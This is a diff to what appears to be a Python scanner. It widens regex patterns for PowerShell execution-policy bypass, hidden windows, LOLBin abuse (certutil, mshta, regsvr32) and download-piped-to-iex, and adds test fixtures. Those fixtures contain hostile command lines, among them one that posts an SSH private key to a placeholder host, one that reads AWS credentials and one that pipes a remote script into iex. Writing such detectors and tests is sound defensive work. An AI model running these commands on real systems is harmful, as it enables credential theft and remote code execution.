@@ -123,8 +123,8 @@ _TAMPER = [
         (r"(?:Add|Set)", "-Mp", r"Preference\b[^\n]*-Exclusion"),
     )
 ]
-_HIDDEN = _J((r"-Window", r"Style\s+", "Hidden"))
-_BYPASS = _J((r"-Execution", r"Policy\s+", "(?:By", "pass|Unre", "stricted)"))
+_HIDDEN = _J((r"-Window", r"Style(?:\s+|\s*:\s*)", "Hidden"))
+_BYPASS = _J((r"-Execution", r"Policy(?:\s+|\s*:\s*)", "(?:By", "pass|Unre", "stricted)"))
 _BYPASS_ARRAY = _J(
     (r"['\"]-Execution", r"Policy['\"]\s*,\s*['\"](?:By", "pass|Unre", r"stricted)['\"]")
 )
@@ -160,10 +160,12 @@ _CRED_MARKERS = [
         (r"\.gnu", r"pg[/\\]"),
     )
 ]
-_ENV_ACCESS = r"os\.environ|getenv\(|process\.env|\$env:|%(?:LOCAL)?APPDATA%|expanduser\("
+_ENV_ACCESS = (
+    r"os\.environ|getenv\(|process\.env|\$env:|%(?:LOCAL)?APPDATA%|expanduser\(|\$\{?HOME\b|~/\."
+)
 _NETWORK = (
     r"\brequests\.|urllib\.request|urlopen\(|http\.client|\bhttpx\.|socket\.socket|\bfetch\("
-    r"|Invoke-WebRequest|Invoke-RestMethod|WebClient|aiohttp"
+    r"|Invoke-WebRequest|Invoke-RestMethod|WebClient|aiohttp|^\s*(?:curl|wget)\s"
 )
 _SYSDIR = r"(?i)\b(?:System32|SysWOW64)\b"
 _COPY_CALL = (
@@ -177,11 +179,11 @@ _STARTS_PROCESS = r"subprocess\.|Popen\(|run_pwsh\(|Start-Process\b|os\.startfil
 _LOLBIN = [
     _J(p)
     for p in (
-        (r"\bcert", r"util(?:\.exe)?\s+[^\n]*-(?:url", "cache|de", "code)"),
-        (r"\bbits", r"admin(?:\.exe)?\s+/trans", "fer"),
-        (r"\bms", r"hta(?:\.exe)?\s+['\"]?(?:https?|vb", "script|java", "script):"),
-        (r"\bregsvr", r"32(?:\.exe)?\s+[^\n]*/i:\s*['\"]?https?:"),
-        (r"\brun", r"dll32(?:\.exe)?\s+java", "script:"),
+        (r"\bcert", r"util(?:\.exe)?['\"]?\s+[^\n]*-(?:url", "cache|de", "code)"),
+        (r"\bbits", r"admin(?:\.exe)?['\"]?\s+/trans", "fer"),
+        (r"\bms", r"hta(?:\.exe)?['\"]?\s+['\"]?(?:https?|vb", "script|java", "script):"),
+        (r"\bregsvr", r"32(?:\.exe)?['\"]?\s+[^\n]*/i:\s*['\"]?https?:"),
+        (r"\brun", r"dll32(?:\.exe)?['\"]?\s+java", "script:"),
     )
 ]
 _PERSIST = [
@@ -292,7 +294,7 @@ def _check_system_copy(path, lines, text):
         if _is_comment(line):
             continue
         is_copy = copy_call.search(line) or (
-            path.endswith((".sh", ".bat", ".cmd", ".yml", ".yaml")) and shell_copy.search(line)
+            path.endswith((".sh", ".yml", ".yaml") + POWERSHELL_LIKE) and shell_copy.search(line)
         )
         if not is_copy:
             continue
@@ -370,6 +372,14 @@ def _inside_literal(line: str, position: int) -> bool:
 def _check_remote_exec(path, lines, text):
     piped = re.compile(r"(?i)(https?://[^\s|'\"`]+|\)|\$[\w:]+)['\"]?\s*(\|)\s*" + _IEX + r"\b")
     wrapped = re.compile(r"(?i)\b" + _IEX + r"\s*\(+\s*" + _DOWNLOADERS)
+    # `irm <url> -UseBasicParsing | iex`: options between the download and the pipe.
+    fetched = re.compile(
+        r"(?i)\b"
+        + _DOWNLOADERS
+        + r"\s+(?:-\w+\s+)*['\"]?(?:https?://|\$)[^|\n]*(\|)\s*"
+        + _IEX
+        + r"\b"
+    )
     out = []
     for i, line in enumerate(lines):
         # Only our own one-liner is excused, and only where it is text: a comment, or a
@@ -380,7 +390,7 @@ def _check_remote_exec(path, lines, text):
             ours = _FIRST_PARTY.match(match.group(1)) is not None
             if not (ours and (quoted_doc or _inside_literal(line, match.start(2)))):
                 hit = True
-        for match in wrapped.finditer(line):
+        for match in list(wrapped.finditer(line)) + list(fetched.finditer(line)):
             ours = _FIRST_PARTY.search(line) is not None
             if not (ours and (quoted_doc or _inside_literal(line, match.start()))):
                 hit = True
@@ -1054,6 +1064,43 @@ def _fixtures() -> list[tuple[str, str, str, bool]]:
             "s.py",
             "import os, requests\nk = os.environ['HOME'] + '/.sol"
             + "ana/validator_key'\nrequests.post(u)\n",
+            True,
+        ),
+        (
+            "AV005",
+            "t.ps1",
+            "irm https://example.invalid/x.ps1 -UseBasicParsing | " + _J(("i", "ex")),
+            True,
+        ),
+        (
+            "AV007",
+            "t.bat",
+            "powershell.exe -WindowStyle:Hidden -ExecutionPolicy:"
+            + _J(("By", "pass"))
+            + " -File a.ps1",
+            True,
+        ),
+        ("AV009", "t.ps1", "copy $env:SystemRoot\\System32\\where.exe .\\tool.exe", True),
+        (
+            "AV011",
+            "t.ps1",
+            "& "
+            + q
+            + "C:\\Windows\\System32\\ms"
+            + "hta.exe"
+            + q
+            + " "
+            + q
+            + "https://example.invalid/a.hta"
+            + q,
+            True,
+        ),
+        (
+            "AV008",
+            "s.sh",
+            "curl -F key=@$HOME/.ssh/"
+            + _J(("id_", "rsa"))
+            + " https://example.invalid/u\ncat $HOME/.aws/credentials\n",
             True,
         ),
         # Suppression is honoured outside the shipped installers and ignored inside them.
